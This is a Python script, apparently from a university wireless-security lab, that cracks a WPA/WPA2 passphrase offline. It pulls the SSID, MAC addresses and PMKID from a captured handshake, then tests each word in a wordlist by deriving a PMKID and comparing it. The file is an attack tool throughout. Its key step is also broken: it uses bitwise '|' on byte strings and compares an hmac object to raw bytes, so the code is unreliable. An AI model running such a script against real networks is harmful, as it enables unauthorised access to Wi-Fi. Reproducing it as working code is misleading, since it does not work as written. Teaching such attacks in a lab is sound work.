#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey | modified By Schranz Guillaume et Lièvre Loïc"
__copyright__   = "Copyright 2021, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def getBeacon(pkts):
    """
    Trouve le 1er beacon qui contient un SSID d'une liste de paquet
    """
    for pkt in pkts:
        if pkt.type == 0 and pkt.subtype == 8:
                return pkt

def getFirstHandshake(pkts, apMAC):
    """
    Trouve le 1er Handshake d'une liste de paquets
    à l'aide de la mac de l'AP et du client
    """
    for pkt in pkts:
        if pkt.haslayer(EAPOL) and pkt.type == 2 and pkt.subtype == 8:
            pktSrc = a2b_hex(pkt.addr2.replace(":", ""))
            if pkt.FCfield == "from-DS" and pktSrc == apMAC:
                return pkt

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

#trouve le beaucon avec le SSID
packetBroadcast = getBeacon(wpa)

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = packetBroadcast.info.decode() #on recupere le ssid dans le beacon
APmac       = a2b_hex(packetBroadcast.addr2.replace(":", "")) #on recupere la mac de l'ap dans le handshake 1
packetHS1   = getFirstHandshake(wpa, APmac) #on va chercher le handshake 1
Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du client dans le handshake 1
pmkid = raw(packetHS1)[-20:-4] #on recupere le pmkid du handshake 1

print ("\n\nValues used to construct PMKID")
print ("============================")
print ("Passphrase: ",passPhrase,"\n")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("PMKID: ", b2a_hex(pmkid),"\n")

#on ouvre le fichier de mots
fileWords = open("wordslist.txt", "r")

#on teste chaque mot du fichier
for word in fileWords.readlines():
    #on nettoie le mot sinon \n fais encore partie du mot
    cleanWord = word.strip()
    passPhrase = str.encode(cleanWord)

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

    wordPMKID = hmac.new(pmk, b"PMK Name" | APmac | Clientmac,hashlib.sha1)
    
    print(wordPMKID)
    print(pmkid)

    #on vérifie sir les deux mic sont egaux
    if wordPMKID == pmkid:
        print ("Correct passphrase : " + cleanWord)
        print ("=============================")
        print ("Passphrase: ",passPhrase,"\n")
        print ("SSID: ",ssid,"\n")
        print ("AP Mac: ",b2a_hex(APmac),"\n")
        print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
        print ("PMKID: ", b2a_hex(pmkid),"\n")
        exit()
    else:
        print("Wrong passphrase : " + cleanWord)

#si on arrive ici c'est qu'aucune passphrase n'est correcte
print("No correct passphrases found")